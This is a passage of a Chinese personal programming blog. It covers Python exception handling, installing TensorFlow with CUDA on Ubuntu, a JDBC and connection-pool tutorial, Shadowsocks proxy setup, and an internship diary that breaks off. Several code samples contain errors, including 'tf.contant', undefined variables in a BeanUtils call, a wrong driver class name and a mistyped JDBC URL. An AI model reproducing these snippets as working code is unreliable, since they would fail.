抛出异常时可以附带参数，之后在 `except` 时，可以通过 `except Exception as e` 把异常对象保存到变量 e (也可以叫别的)。\n```python\n# 插入身高的程序\nheights = [164, 167, 169, 171]\ndef record_height(index, height):\n    if index >= len(heights):\n        raise IndexError(index)\n    else:\n        heights[index] = height\n\ntry:\n    record_height(5, 185)\nexcept Exception as e:\n    print(\"列表不存在第\", e, \"个元素\")\n```\n#### 自定义异常  \n自定义异常其实就是定义一个类，让其继承自 `Exception`。\n```python\nclass AssignmentError(Exception):\n    def __init__(self, index, height, message):\n        self.index = index\n        self.height = height\n        self.message = message\n\n# 对于定义的 exception 中的三个实例变量，message 用于在控制台输出错误信息，index 和 height 修复列表元素不足的问题，然后尝试重新插入。\n```\n#### 中止重试  \n```python\nheights = [164, 167, 169, 171]\ndef record_height(index, height):\n    if index >= len(heights):\n        raise AssignmentError(index, height, \"\\n遇到异常（不存在该元素，尝试处理\\n\")\n    else:\n        heights[index] = height\n\ntry:\n    record_height(4, 185)\nexcept AssignmentError as e:\n    print(e.message) # 输出上面传入的 message 信息。\n    heights.append(e.height)\n```\n#### 改进  \n额外的一些要求：如果插入的 index 大于 heights 的长度 4，比如在 index 为 6 处插入 180，则 180 和前面就有两个空格，应该在空格处填入 0，得到 heights = [164, 167, 169, 171, 0, 0, 180]\n```python\ntry:\n    record_height(6, 180)\nexcept AssignmentError as e:\n    print(e.message)\n    for index in range(len(heights), e.index):\n        heights.append(0)\n    heights.append(e.height)\n```\n如果还有其他的要求比如原来填过身高的位置不能再覆盖填写等等就靠自己去试着写写吧。","tags":["Python"]},{"title":"Ubuntu16.04 使用 Anaconda 安装 Tensorflow","url":"/2017/11/27/ubuntu-install-tensorflow/","content":"\n\n## 安装 Anaconda\n\n去 [官网](https://www.anaconda.com/download/#linux) 下载 [Anaconda3-5.1.0-Linux-x86_64.sh](https://repo.continuum.io/archive/Anaconda3-5.1.0-Linux-x86_64.sh)，这里我下载的版本是 `Python3.6` 的。\n\n![下载 Anaconda](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627175555.png)\n\n使用 `sh` 命令，`sh Anaconda3-5.1.0-Linux-x86_64.sh`，根据提示完成安装。\n\n### 添加镜像地址\n\n为防止安装包过程中速度过慢，添加国内镜像地址。  \n\n```bash\n# 添加清华依赖访问地址\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n# 设置搜索时显示通道地址\nconda config --set show_channel_urls yes\n```\n\n也可以在 `~/.condarc` 文件中直接添加和修改。\n\n### 添加环境\n\nAnaconda 可以为不同的项目建立不同的运行环境，使用 `conda create -n env_name` 命令来创建环境（env_name 即环境名称）。  \n如果想重命名某一个环境，Anaconda 没有相关命令可以直接修改环境名称，这里只能先克隆环境再将原环境删除。\n\n```bash\nconda create --name new_name --clone old_name\nconda remove --name old_name --all\n```\n\n### 安装时候遇到的坑\n\n因为我终端使用的是 zsh，而安装 Anaconda 添加命令路径到的是 bash，导致我在 zsh 里面运行 conda 命令提示 command not found。  \n解决办法，在 `~/.zshrc` 或者 `/etc/profile` 后面添加上 Anacodna 安装目录下的 bin 目录即可。\n\n```bash\nexport PATH=/home/lihui/anaconda3/bin:$PATH\n```\n\n## 安装 Tensorflow CPU 版\n\nCPU 版本的 Tensorflow 安装很简单，几条命令即可  \n建立环境 `conda create -n tensorflow_cpu python=3.6`  \n激活环境 `source activate tensorflow_cpu`  \n在环境中安装 `pip install tensorflow`   \n进入 python 测试\n\n```python\nimport tensorflow as tf\nhello = tf.contant('hello')\nsess = tf.Session()\nsess.run(hello)\n```\n\n如果输出 b'hello'，则说明安装没有问题。\n\n## 安装 Tensorflow GPU 版\n\n当前最顶级的CPU只有4核或者6核,模拟出8个或者12个处理线程来进行运算,但是普通级别的GPU就包含了成百上千个处理单元,高端的甚至更多,这对于多媒体计算中大量的重复处理过程有着天生的优势，而CNN中的卷积操作则正是这种大量的、重复的计算。  \n安装 GPU 版本 Tensorflow 要求显卡的计算能力大于 3.5，我的显卡满足要求所以想尝尝鲜。  \n安装 Tensorflow 之前先要安装 `CUDA` 和 `CUDNN`，下面的安装步骤是我综合众多安装教程得出的，如果英语好有耐心而且可以翻墙，最好去看官方的 `installation guide` 或者 `quickstart tutorial`，不管安装使用什么软件，官方说明永远是最清楚明白的。\n\n### 安装 NVIDIA 驱动\n\n使用 `ubuntu-drivers devices` 命令查看你的显卡支持而且推荐的驱动（后面有个 recommended），我的推荐安装 nvidia-384，来开始安装吧。  \n关闭 Ubuntu 的图形界面（`sudo service lightdm stop`)，黑屏不要慌，按住 `ctrl+alt+f1` 进入 `tty` 模式，输入用户名密码进入终端，执行命令安装相对应驱动（`sudo apt install nvidia-384`)，重启（`reboot`）。重启后进入系统，打开 `NVIDIA X Server Settings` 查看 `PRIME Profiles` 是不是 `NVIDIA`，如果不是修改成 `NVIDIA` 重新重启。\n\n### 安装 CUDA 驱动\n\n1. 目前 Tensorflow 最新只支持 CUDA 9.0，所以最高只能下载 CUDA 9.0，亲身经历告诉你，如果下载 9.1 即以上版本会报错（具体什么错忘记截图了）。\n2. 进入下载页面后，下载 runfile 文件！！！（我下成 deb 文件，安装没问题，后面使用出问题了。。）\n3. CUDA 不支持新版本的 gcc，所以先进行 [gcc 降级](https://www.cnblogs.com/in4ight/p/6626708.html)，然后再来安装 CUDA。\n\n```sh\n# 安装低版本 gcc\nsudo apt install gcc-4.8\n# 查看已有的 gcc\nls /usr/bin/gcc*\n# 设置优先级，最后一个数字为优先级\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 100\n# 查看优先级\nsudo update-alternatives --config gcc\n```\n\n4. Tensorflow 官方说明 CUDA 9.0 还要安装 libcupti-dev（`sudo apt install libcupti-dev`）。\n5. 现在开始安装CUDA，同样关闭 Ubuntu 图形界面（`sudo service lightdm stop`) \n6. 接下来还要禁用 Ubuntu 自带的显卡驱动，创建新文件 `/etc/modprobe.d/blacklist-nouveau.conf`，并填入下面两行\n\n```bash\nblacklist nouveau\noptions nouveau modeset=0\n```\n\n  然后重新生成内核参数（`sudo update-initramfs -u`） \n\n7. 然后进入下载目录，开始安装（`sudo sh cuda_9.0.176_384.81_linux.run`) \n8. `ctrl+c` 跳过许可证之类的东西，输入 accept 开始安装，在安装过程中，选择不安装 NVIDIA 驱动和 openGL 库，安装完成后开始配置环境变量。在 `~/.bashrc` 或者 `~/.zshrc` 或者 `/etc/profile` 后添加\n\n```bash\nexport PATH=/usr/local/cuda/bin:$PATH\nexport LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/local/cuda-8.0/extras/CUPTI/lib64:$LD_LIBRARY_PATH\nexport CUDA_HOME=/usr/local/cuda\n```\n\n9. 使用 `nvcc -V` 命令可以查看 CUDA 版本。  \n\n### 测试 CUDA\n\n进入安装时安装的 `~/NVIDIA_CUDA-9.0_Samples` 目录，编译 CUDA 的示例文件（`make`）等待 10 分钟左右无报错即可。  \n进入生成的 bin 目录下找到编译好的文件并随意运行一个，这里选择 deviceQuery（`./deviceQuery`)，得到最后结果 `Result = PASS` 则说明安装成功。\n\n### 安装 CUDNN\n\n1. 去 NVIDIA 下载 CUDA 版本相对应的 CUDNN `.tgz` 包 \n2. 解压（`tar xvf cudnn-9.0-linux-x64-v7.tgz`)\n3. 将解压后 `cuda/include` 目录中的 `cudnn.h` 文件拷贝到 `/usr/local/cuda/include/` 目录下（`sudo cp cuda/include/cudnn.h /usr/local/cuda/include`） \n4. 将 `cuda/lib64` 目录中的库拷贝到 `/usr/local/cuda/lib64/` 目录下（`sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64`）\n5. 再赋予相关权限（`sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn*`），这样，CUDNN 就安装好了。\n6. 如果要卸载 CUDA，在 `/usr/local/cuda/bin` 目录下,有 cuda 自带的卸载工具可以使用（`sudo ./uninstall_cuda_9.0.pl`）。\n7. 如果要卸载 NVIDIA 驱动，`sudo apt purge nvidia-*` 或者 `sudo apt purge nvidia-\\*`。\n\n### 安装 Tensorflow\n\n建立环境 `conda create -n tensorflow_g`  \n激活环境 `source activate tensorflow_g`  \n在环境中安装 `pip install tensorflow-gpu`  \n测试后退出 `source deactivate`  \n\n## 其他\n\n### 参考教程\n\n[教程1](https://segmentfault.com/a/1190000008234390)  \n[教程2](https://www.linuxidc.com/Linux/2016-11/137561.htm)\n[出现循环登录的问题](https://www.jianshu.com/p/34236a9c4a2f)\n\n### 查看 Tensorflow 跑的是 CPU 还是 CPU版本\n\n直接 `session.run` 运行个 `a+b` 的运算，会有设备初始化的提示\n\n```python\n# Creates a graph.\na = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[2, 3], name='a')\nb = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[3, 2], name='b')\nc = tf.matmul(a, b)\n# Creates a session with log_device_placement set to True.\nsess = tf.Session(config=tf.ConfigProto(log_device_placement=True))\n# Runs the op.\nprint(sess.run(c))\n```","tags":["ubuntu","tensorflow"]},{"title":"学习 JDBC","url":"/2017/09/10/jdbc/","content":"\n暑假实习完后，回家待了一个星期，然后回校学习了，学了点东西，不过一直没有写总结（所以博客一直没更），后面慢慢找时间补上来。  \n转眼新的一周又到了，本来这篇总结是周末应该完成的，昨天体检因为网络问题耽搁了好久，晚上将近 7 点才回到学校，然后就没有过来实验室了。  \n进入正题，这是一篇关于使用 Java 操作数据库的总结，也就是 JDBC (Java Database Connectivity)，以使用 MySQL 数据库为例。另外这篇文章有点长，原本打算分成两个部分，想了想，没有这个必要，我写的还算清楚。\n\n## JDBC 编程步骤\n\n1. **加载数据库驱动**  \n   导入对应数据库所需的驱动  \n   Class.forName(\"com.mysql.jdbc.Driver\");\n2. **通过 DriverManager 获取数据库连接**  \n   DriverManager.getConnection(String url, String username, String password);  \n   Url 格式：jdbc:subprotocol:...  \n   MySQL 格式：jdbc:mysql://hostname:port/databasename  \n3. **通过 Connection 创建 Statement**  \n   Statement stmt = conn.createStatement();  \n   PreparedStatement ps = conn.prepareStatement();  \n4. **使用 Statement 执行 sql 语句**  \n   executeUpdate();  \n   executeQuery();  \n5. **操作结果集**  \n   next(), previous()...  \n   getXxx();  \n6. **关闭数据库资源**  \n   xxx.close();  \n   先关闭后打开的。\n\n## 利用反射获取查询到的一条数据所对应的对象\n\n当数据库表中每一行数据就是一个对象，且存在该对象所对应的类时，即可使用如下代码获取数据库对象。代码很好懂，不做过多解释了，有问题可以发我邮箱一起讨论。\n\n```Java\n// 需要导入 BeanUtils 和 Logging Jar 包（apache commons）\npublic <T> T get(Class<T> clazz, String sql, Object... args) {\n    T entity = null;\n    Connection conn = null;\n    PreparedStatement ps = null;\n    ResultSet rs = null;\n    try {\n        conn = JDBCTools.getConnection();\n        ps = conn.prepareStatement(sql);\n        // 填充 PreparedStatement 占位符\n        for (int i = 0; i < args.length; i++) {\n            ps.setObject(i + 1, args[i]);\n        }\n        rs = ps.executeQuery();\n        if (rs.next()) {\n            entity = clazz.newInstance();\n            ResultSetMetaData rsmd = rs.getMetaData();\n            for (int i = 0; i < rsmd.getColumnCount(); i++) {\n                String columnLabel = rsmd.getColumnLabel(i + 1);\n                Object columnValue = rs.getObject(i + 1);\n                // 给对象的属性赋值\n                BeanUtils.setProperty(entity, propertyName, propertyValue);\n            }\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        JDBCTools.release(rs, ps, conn);\n    }\n    return entity;\n}\n```\n\n同理，获取查询到的一组对象，把结果集的 if 判断改成 while。\n\n```Java\npublic <T> List<T> getList(Class<T> clazz, String sql, Object... args) {\n    List<T> list = new ArrayList<>();\n    Connection conn = null;\n    PreparedStatement ps = null;\n    ResultSet rs = null;\n    try {\n        conn = JDBCTools.getConnection();\n        ps = conn.prepareStatement(sql);\n        for (int i = 0; i < args.length; i++) {\n            ps.setObject(i + 1, args[i]);\n        }\n\n        rs = ps.executeQuery();\n\n        ResultSetMetaData rsmd = rs.getMetaData();\n        T entity = null;\n        while (rs.next()) {\n            entity = clazz.newInstance();\n            for (int i = 0; i < rsmd.getColumnCount(); i++) {\n                String columnLabel = rsmd.getColumnLabel(i + 1);\n                Object value = rs.getObject(i + 1);\n                BeanUtils.setProperty(entity, columnLabel, value);\n            }\n            list.add(entity);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        JDBCTools.release(rs, ps, conn);\n    }\n    return list;\n}\n```\n\n写到这里，为了统一，可以直接将获取单个对象的方法改为如下\n\n```Java\npublic <T> T get(Class<T> clazz, String sql, Object...args) {\n    List<T> list = getList(clazz, sql, args);\n    if (list.size() > 0) {\n        return list.get(0);\n    }\n    return null;\n}\n```\n\n一样的操作，写一个方法来获取某条数据的某一个值（查询结果只有一行一列）\n\n```Java\npublic <E> E getValue(String sql, Object... args) {\n    Connection conn = null;\n    PreparedStatement ps = null;\n    ResultSet rs = null;\n    try {\n        conn = JDBCTools.getConnection();\n        ps = conn.prepareStatement(sql);\n        for (int i = 0; i < args.length; i++) {\n            ps.setObject(i + 1, args[i]);\n        }\n        rs = ps.executeQuery();\n        if (rs.next()) {\n            return (E) rs.getObject(1);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        JDBCTools.release(rs, ps, conn);\n    }\n    return null;\n}\n```\n\n上面说的这些方法共同组成了数据访问对象，也就是 DAO(Data Acess Object)，在 DAO 里，还可以根据自己的需要添加其他的方法。\n\n## JDBC 元数据\n\n- DatabaseMetaData（描述数据库的元数据，做了解就行，不常用）\n  - DatabaseMetaData dbmd = connection.getMetaData();\n  - 以下是数据库的基本信息\n  - dbmd.getDatabaseMajorVersion(); // 数据库版本号\n  - dbmd.getUsername(); // 连接到数据库的用户名\n  - dbmd.getCatalogs(); // 得到有哪些数据库,返回一个 ResultSet\n- ResultSetMetaData//描述结果集的元数据\n  - ResultSetMetaData rsmd = resultSet.getResultSetMetaData();\n  - rsmd.getColumnCount(); // 列的个数\n  - rsmd.getColumnName(int i); // 得到第 i 列的列名（i 从 1 开始）\n  - rsmd.getColumnLabel(int i); // 得到列的别名\n  - 还有其他一些方法可以自己查阅 API 使用\n\n## 获取数据库自动生成的主键值\n\n```Java\n//以 PreparedStatement 为例，在获取时\nPreparedStatement ps = connection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);\n// 然后在 sql 语句执行结束后  \nResultSet rs = ps.getGeneratedKeys(); // 获取到的结果集只有一列 GENERATED_KEY\nif (rs.next()) {\n    String key = rs.getObject(1);\n}\n```\n\n## 使用 jdbc 处理 Blob\n\nTinyBlob：255字节  \nBlob：65K  \nMediumBlob：16M  \nLongBlob：4G  \n\n1. 使用 PreparedStatement 插入 Blob  \n   在设置 ps 占位符的时候，使用 ps.setBlob(int position, InputStream stream) 来传入一个输入流即可\n2. 使用 PreparedStatement 输出 Blob\n\n```Java\nBlob blob = resultSet.getBlob(int column);\nInputStream int = blob.getBinaryStream();\nOutputStream out = new FileOutputStream(\"xxx.xxx\");\n// 获取到相应的输入流后使用 IO 操作即可\nbyte[] buffer = new byte[1024];\nint len = 0;\nwhile(len = in.read(buffer) != -1) {\n    out.write(buffer, 0, len)\n}\nout.close();\nin.close();\n```\n\n## 使用 JDBC 处理事务\n\n事务的四个(ACID)属性：原子性， 一致性， 隔离性， 持久性  \n\n1. 事务中的每个操作要使用相同的连接\n2. 使用步骤\n   - 事务操作开始前，关闭默认提交\n   - 如果事务操作都成功，则提交事务\n   - 若出现异常，则在 catch 块中回滚事务\n\n```Java\ntry {\n    //开始事务\n    connection.setAutoCommit(false);//取消默认提交\n\n    // 事务\n    // 事务\n\n    connection.commit();\n    // 事务完成，提交\n    connection.commit();\n} catch (Exception e) {\n    e.printStackTrace();\n    //如果发生异常，回滚事务\n    try {\n        connection.rollback();\n    } catch (Exception e) {\n        e.printStackTrace();\n    } \n} finally {\n    // 回收数据库资源\n}\n```\n\n## 数据库的隔离级别\n\n- 脏读: 对于两个事物 T1, T2, T1 读取了已经被 T2 更新但还没有被提交的字段. 之后, 若 T2 回滚, T1读取的内容就是临时且无效的.\n- 不可重复读: 对于两个事物 T1, T2, T1 读取了一个字段, 然后 T2 更新了该字段. 之后, T1再次读取同一个字段, 值就不同了.\n- 幻读: 对于两个事物 T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行. 之后, 如果 T1 再次读取同一个表, 就会多出几行.\n\n| 隔离级别                        | 描述                                                         |\n| ------------------------------- | ------------------------------------------------------------ |\n| READ UNCOMMITTED (读未提交数据) | 允许事务读取未被其他事务提交的变更、脏读，不可重复读和幻读的问题都会出现 |\n| READ COMMITTED (读已提交数据)   | 只允许事务读取已经被其他事务提交的变更，可以避免脏读，但不可重复读和幻读问题仍然可能出现 |\n| REPEATABLE READ (可重复读)      | 确保事务可以多次从一个字段中读取相同的值。在这个事务持续期间，禁止其他事务对这个字段进行更新。可以避免脏读和不可重复读，但幻读的问题仍然存在 |\n| SERIABLIZABLE (串行化)          | 确保事务可以从一个表中读取相同的行。在这个事务持续期间，禁止其他事务对该表执行插入、更新和删除操作。所有并发问题都可以避免，但性能十分低下 |\n\n查看当前的隔离级别: SELECT @@tx_isolation;  \n\n- 设置当前 mySQL 连接的隔离级别:  \n  set  transaction isolation level read committed;  \n- 设置数据库系统的全局的隔离级别:  \n  set global transaction isolation level read committed;\n\n在 Java 代码中设置隔离级别\nconnection.setTransactionIsolation(Connection.TRANSACTION_READ_COMMITTED);  \n如果经常切换数据库，而且数据库的隔离级别位置，最好填上这一行代码。\n\n## 批量处理数据\n\n一次行向数据库插入 100000 条数据\n\n```Java\nString sql = \"INSERT INTO test VALUES(?, ?)\";\npreparedStatement = connection.prepareStatement(sql);\n\nfor (int i = 0; i < 100000; i++) {\n    preparedStatement.setInt(1, i + 1);\n    preparedStatement.setString(2, \"name_\" + i);\n\n    //“积攒” SQL语句\n    preparedStatement.addBatch();\n    // 每“积攒”300条就统一执行一次，并且清空先前“积攒”的SQL\n    if((i+ 1) % 300 == 0) {\n        preparedStatement.executeBatch();\n        preparedStatement.clearBatch();\n    }\n}\n// 若总条数不是批量值的整数倍，则还需要额外再执行一次\nif (100000 % 300 != 0) {\n    preparedStatement.executeBatch();\n    preparedStatement.clearBatch();\n}\n```\n\n## DBCP数据库连接池\n\n第一种创建连接池方法\n\n```java\n// 导入DBCP和Pool包\nBasicDataSource dataSource = null;\n// 创建 DBCP 数据库实例\ndataSource = new BasicDataSource();\n\n// 为数据库源实例制定必须的属性\ndataSource.setUsername(\"root\");\ndataSource.setPassword(\"*****\");//这里密码我就不写出来了\ndataSource.setUrl(\"jdbc:mysql://localhost:3306/school\");\ndataSource.setDriverClassName(\"com.kdbc.mysql.Driver\");\n\n// 指定数据源一些可选的属性\n// 指定数据源初始化连接数的个数\ndatasource.setInitalSize(10);\n// 指定同一时刻最大的活动连接数\ndatasource.setMaxActive(50);\n// 指定最小连接数：在数据库连接池中能够保存下来的最小连接的数量\ndatasource.setMinIdle(5);\n// 等待数据库连接池分配连接的最大等待时间（毫秒），超出则异常\ndatasource.setMaxWait(5000);\n\n// 从数据源中获取数据库连接\nConection connection = dataSource.getConnection();\n```\n\n第二种创建连接池方法\n\n```Java\nProperties pp = new Properties();\nFileInputStream fis = new FileInputStream(\"dbcp.properties\");\npp.load(fis);\nfis.close();\nDataSource source = BasicDataSourceFactory.createDataSource(properties);\n```\n\n属性文件\n\n```\nproperties:\n# 必须属性\nusername = root\npassword = *****;\ndriverClassName = com.mysql.jdbc.Driver\nurl = jdbc:mysql://localhost:3306/school\n\n# 可选属性\ninitialSize = 10\nmaxActive = 50\nminIdle = 5\nmaxWait = 5000\n```\n\n## c3p0 数据库连接池\n\n[C3P0官网](http://www.mchange.com/projects/c3p0/)\n第一种方法\n\n```Java\n// 添加 jar 包\nComboPooledDataSource cpds = new ComboPooledDataSource();\ncpds.setDriverClass(\"com.mysql.jdbc.Driver\");\ncpds.setJdbcUrl(\"jdbs:mysql://localhost:3306/school\");\ncpds.setUser(\"root\");\ncpds.setPassword(\"*****\");\n\n```\n\n第二种方方法\n创建 c3p0-config.xml 配置文件\n\n```xml\n<c3p0-config>\n\n  <named-config name=\"helloc3p0\"> \n    <!-- 指定连接数据源的基本属性 -->\n\t\t<property name=\"user\">root</property>\n\t\t<property name=\"password\">1230</property>\n\t\t<property name=\"driverClass\">com.mysql.jdbc.Driver</property>\n\t\t<property name=\"jdbcUrl\">jdbc:mysql:///atguigu</property>\n\t\t\n\t\t<!-- 若数据库中连接数不足时, 一次向数据库服务器申请多少个连接 -->\n\t\t<property name=\"acquireIncrement\">5</property>\n\t\t<!-- 初始化数据库连接池时连接的数量 -->\n\t\t<property name=\"initialPoolSize\">5</property>\n\t\t<!-- 数据库连接池中的最小的数据库连接数 -->\n\t\t<property name=\"minPoolSize\">5</property>\n\t\t<!-- 数据库连接池中的最大的数据库连接数 -->\n\t\t<property name=\"maxPoolSize\">10</property>\n\n\t\t<!-- C3P0 数据库连接池可以维护的 Statement 的个数 -->\n\t\t<property name=\"maxStatements\">20</property>\n\t\t<!-- 每个连接同时可以使用的 Statement 对象的个数 -->\n\t\t<property name=\"maxStatementsPerConnection\">5</property>\n\n  </named-config>\n</c3p0-config>\n```\n\n使用以上 xml 文件建立数据库连接池\n\n```Java\nDataSource source = new ComboPooledDataSource(\"helloc3p0\");\nComboPooledDataSource cpds = (ComboPooledDataSource) source;\n```\n\n数据库连接池中的 Connection 关闭时不时真的进行关闭，而是将该数据库连接归还到数据库连接池中。\n\n## 使用 DBUtils\n\n直接看 [源码](/assets/jdbc/TestDBUtils.java) 吧，写得很详细了\n\n## 相关源码\n\n本片文章的相关代码我已经上传到 github 上了，在 [这个文件夹](/assets/jdbc) 里，`.java`后缀的文件都是，代码和注释都写得挺详细，有问题可以发我邮箱一起讨论。","tags":["Java","JDBC"]},{"title":"Ubuntu16.04 配置代理","url":"/2017/07/29/browser-proxy/","content":"\n## 安装 Shadowsocks\n\nubuntu 16.04 上安装 Shadowsocks 很简单，打开终端，直接输入下面三条命令\n\n```\nsudo add-apt-repository ppa:hzwhuang/ss-qt5\nsudo apt update\nsudo apt install Shadowsocks-qt5\n```\n\n接下来按 super 键搜索 Shadowsocks 就可以发现安装成功了，打开用你的 ss 帐号新建连接并连接，这时虽然连接上了但是打开 Firefox 或者 Chrome 还是无法科学上网，因为还需要配置你的浏览器（再提醒一遍，windows 用户是不用做接下来的步骤，所以可以直接关闭网页了，本身本文就是在 ubuntu 系统环境下 ss 的使用）。\n\n## 浏览器配置\n\nFirefox 和 Chrome 设置项是包含代理设置的，可以直接设置代理，以 Firefox 为例，进入偏好设置 --> 高级设置 --> 网络 --> 连接设置 --> 手动设置代理，填上 socks 主机和端口（我用的主机是 127.0.0.1,端口1080），点击确定即可。这时可以 kexue 上网了，但是这里的科学上网是全局的，也就是说，用百度，新浪等国内网站也从国外绕一圈回来，这就很浪费时间了，所以有了如下配置来实现自动切换代理。\n\n### Firefox 配置 Foxyproxy\n\n打开 Firefox 浏览器，ctrl+shift+a 调出附加组件管理器，搜索 Foxyproxy Standard，安装并根据提示重启浏览器。  \n重启浏览器后打开 Foxyproxy，在上面的工作模式中选择第一项“使用基于其预定义模板的代理服务器”，然后点击“新建代理服务器”。  \n在“常规”里填入代理名称，其他不要管，然后在“代理服务器细节”里手动配置代理服务器，填入你的 ss 配置，然后确定。  \n\n![Foxyproxy Configuration](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627174536.png)\n\n然后我们把工作模式换为“为全部 URLs 启用代理服务器+你的刚刚创建的代理名称”。在模式订阅一栏中，添加新的模式订阅。名称自己写，订阅网址这里填「`https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt`」,点击“添加代理服务器”，将你刚刚创建的连接添加进去，Format 选择 AutoProxy，Obfuscation 选择 Base64,更新频率选择 0,然后确定。\n\n![Foxyproxy Configuration](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627174611.png)\n\n这时再把工作模式改为“使用基于其预定义模板的代理服务器”，接下来就是尽情地翻墙使用了。  \n**注意事项**：如果你的浏览器已经装有其他代理插件，请禁用，避免冲突。\n\n### Chrome 配置 SwitchyOmega\n\nSwitchyOmega 插件是无法像 Firefox 那样直接从扩展商店获取的，因为这时候你还没有科学上网，也就没办法访问扩展商店，这里给出 SwitchyOmega的[下载地址](https://SwitchyOmega.com/download.html)，你也可以用我已经下好的  [SwitchOmega.crx](/assets/SwitchyOmega.crx)。  \n下载好 SwitchOmega.crx 后，打开 Chrome，在地址栏输入 `chrome://extensions` 进入扩展程序页面，拖动 SwitchOmega.crx 到该页面即可安装扩展程序。  \n安装好之后地址栏右边一个绿色的小圆就是该插件，点击该插件进入选项，接下来设置你可以使用我的设置（主机：127.0.0.1, 端口：1080），下载我的备份文件 [OmegaOption.bak](/assets/OmegaOptions.bak)(下载方法，打开页面后ctrl+s，保存即可得到 OmegaOption.bak)，然后导入设置，应用选项，点击那个小圆，选择 auto switch即可完成设置。如果想自己设置就看下一步。  \n进入 SwitchOmega 的设置界面，新建情景模式中选择代理服务器，代理协议当然是「SOCKS5」，代理服务器：127.0.0.1, 端口：1080。  \n\n![Chrome Configuration](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627174416.png)\n\n然后新建情景模式中选择自动切换模式，然后点击导入规则列表，列表格式选择 「AutoProxy」，列表网址填「`https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt`」，然后立即更新情景模式，再在上面的切换规则设置项中，设置“按照规则列表匹配请求”为你刚刚新建的代理服务器连接，默认情景模式依然为直接连接\n\n![Chrome Configuration](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627174456.png)\n\n然后应用选项，点击小圆，选择 auto switch 完成设置，接下来就可以科学上网了。\n\n## 小结\n\n其实这两个浏览器的配置是一样的道理，只是用的插件不一样而已。  \n都是先创建代理连接，然后再创建规则，设置符合该规则的网页使用该代理连接，不符合的不使用，上面的订阅网址就是被墙的网站的列表。","tags":["ubuntu","proxy"]},{"title":"暑期实训日志","url":"/2017/07/25/summer-intership-diary/","content":"\n\n## 前言\n\n这里是在暑期实训过程中我自主写的日志（其实就是每天的流水账），我将它记下来因为这是我第一次“实习”，实习过程中学习和心态历程都发生了变化，整个项目到最后应该不能算是令人满意的，希望下次做可以借鉴这次的经历和教训。\n\n## 正文\n\n### 第一天(7/10)\n\n今天完全在打酱油，上午和分小组再加选题目，然后布置任务写开题报告。  \n下午就在写开题报告，写写玩玩的，中间去录了指纹，另外 #204 的网真的太差了，想念 #507 10M/s的宽带。  \n下午我们组员一起聊天开玩笑，出了一点意外发生了不愉快的事情，不写在这里了。\n\n### 第二天(7/11)\n\n上午网络瘫痪，yy经理布置写项目燃尽图，下午交。  \n下午yy经理找我们谈话，知道我名字之后说他前面带过两个叫李辉的学生，第一个是华科大神，大学四年接项目做接了50万；第二个是国防生，学习也刻苦，之前申请保研。后来他问了问我们的编程水平，我们都说比较水，而且一个比一个水。。。他说我们太谦虚了，而实际上我们也只有这个水平，不敢自夸。\n中午我向老师申请去做项目我们班自己的机房 #507 做， #204 网络环境实在太差了，频繁断网，100 来个同学挤在一间教室，空调今天下午又坏了。结果是不同意，要服从学校规定。\n\n### 第三天(7/12)\n\n基本在看书和学习视频 - 有关安卓多线程编程和使用服务。  \n上午把自己安在 #507 的路由器拆了下来，安装在了 #204，用 l2tp 连上校园网才解决了网络问题，不然没有网络感觉是在闭门造车。网络搭好就把经理上传在群里的学习视频下来看，原来用#204的网 100b/s都不到，别说下视频，QQ 都登不上。。。  \n下午就是接着上午继续学习，中间在网上 csdn 和 github 上找了一些 demo 看。  \n和组员zzh的一点小矛盾今天应该是没事了，不想再讲这件事了，真的不想。\n\n### 第四天(7/13)\n\n仿照着前一天下载的 demo，开始实现功能，中间阅读作者源码有地方不懂微信还联系了他(Dylan)，他本人也是很热情地解决了我的疑惑。不过他的 demo 出了个 bug ，和他反映了。他缺少这个型号的机子没办法测试，他说其他的型号目前没问题。  \n\n![反映 bug](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627163714.jpg)\n\n下午又问了他一些问题，基本把他的demo看懂了，接下来就是自己动手抄刀了。中途看代码的时候项目负责人sp过来找我尬聊，了解了我出国的意向，和我说国外其实并不好什么的，推荐我学习完后回国工作，还提了最近国外大学生失踪的事情。这些事情我还说不准，暂时收下她的建议吧，走到那一步才知道后面怎么走。  \n最后下午收工前一个小时还是实现了功能，很高兴。只是更新步数的时候是计时调取数据的。\n\n### 第五天(7/14)\n\n今天本来想给更新步数加个接口写成回调，另外再把计步放入 servie 写成后台，第一个实现了，第二个本来应该上午10点左右就写好的，结果因为一个愚蠢的致命性的错误，查了一天 - service没有在 AndroidManifest.xml 注册，真的是蠢得死。。。  \n下午后来和一个组员tl讨论了一下是实现一个自定义 view，和另外一个组员zff讨论明天开始写后台数据库。  \n这两天手指有点蜕皮，指纹签到有点不灵敏，要按好几下才能识别出来。  \n昨天给组员们每个人买了一杯西瓜汁，今天其中一个组员zff就去给每个人买了一杯奶茶，没有想到实在是太客气了。  \n最近9栋在装修，楼道很吵，时不时桌子还摇晃，体验很差，没办法习惯就好。\n\n### 第六天(7/15)\n\n今天没有怎么做具体的代码实现工作  \n上午去 #204 不知道干了什么就10点半了，剩下一个小时和组员讨论了一下接下来的分工。  \n下午和组员zzf在讨论添加好友功能的实现问题，聊聊玩玩的，一天就过去啦。\n\n### 第七天(7/16)\n\n上午用 ViewPager 和 BottomNavigationView 写出仿微信低栏  \n下午和组员lmj讨论自定义另外一个 view 